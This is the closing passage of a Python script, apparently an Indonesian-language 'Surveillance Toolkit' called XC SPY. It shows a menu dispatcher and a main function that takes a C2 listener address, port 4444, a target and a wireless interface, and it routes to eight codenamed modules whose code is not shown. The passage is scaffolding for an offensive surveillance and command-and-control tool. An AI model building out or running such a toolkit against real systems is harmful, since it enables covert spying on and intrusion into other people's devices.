            mode_key, desc = CODENAMES[cmd]
            if desc: info(f"Executing {cmd} — {desc}")
            time.sleep(0.2)
            dispatch[mode_key]()
        else:
            matches = [k for k in CODENAMES if k.startswith(cmd) and CODENAMES[k][1]]
            if len(matches) == 1:
                mode_key, desc = CODENAMES[matches[0]]
                info(f"Executing {matches[0]}")
                dispatch[mode_key]()
            else:
                print(f"  {R}[!]{RST} Unknown: {cmd} — ketik HELP")

# ═══════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description="XC SPY — Surveillance Toolkit")
    parser.add_argument("mode", nargs="?", default=None,
        help="PHANTOM|SHADOW|SPECTRE|MIRAGE|VENOM|NEXUS|ECLIPSE|BLACKOUT (kosong=menu)")
    parser.add_argument("--lhost", help="C2 IP (auto-detect jika kosong)")
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--target", default="target")
    parser.add_argument("--iface", default="wlan0")
    args = parser.parse_args()
    lhost = args.lhost or get_local_ip()

    dispatch = {
        "phantom": lambda: module_phantom(lhost, args.lport),
        "shadow":  lambda: module_shadow(),
        "spectre": lambda: module_spectre(lhost, args.lport),
        "mirage":  lambda: module_mirage(lhost, args.lport, args.target),
        "venom":   lambda: module_venom(args.iface),
        "nexus":   lambda: module_nexus(lhost, args.lport),
        "eclipse": lambda: module_eclipse(),
        "blackout":lambda: module_blackout(lhost, args.lport),
    }

    if args.mode is None:
        interactive_menu(lhost, args.lport, args.target, args.iface)
    else:
        banner()
        key = args.mode.upper()
        mode_key = CODENAMES.get(key, (args.mode.lower(), ""))[0]
        if mode_key in dispatch:
            dispatch[mode_key]()
        else:
            print(f"{R}[!] Unknown: {args.mode}{RST}")

if __name__ == "__main__":
    main()
